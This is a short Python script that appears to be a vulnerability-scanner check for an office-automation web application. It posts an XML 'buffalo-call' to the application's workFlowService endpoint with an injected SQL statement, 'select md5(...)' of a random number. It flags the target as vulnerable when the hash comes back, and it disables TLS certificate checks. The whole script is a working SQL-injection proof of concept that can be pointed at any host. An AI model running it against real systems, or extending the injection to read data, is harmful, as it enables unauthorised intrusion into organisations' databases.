import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(2000000, 2100000)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"OAapp/bfapp/buffalo/workFlowService"
	body="<buffalo-call><method>getDataListForTree</method><string>select md5("+str(rand)+")</string></buffalo-call>"
	headers={'Content-Type': 'text/xml'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if md5(str(rand).encode()).hexdigest() in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
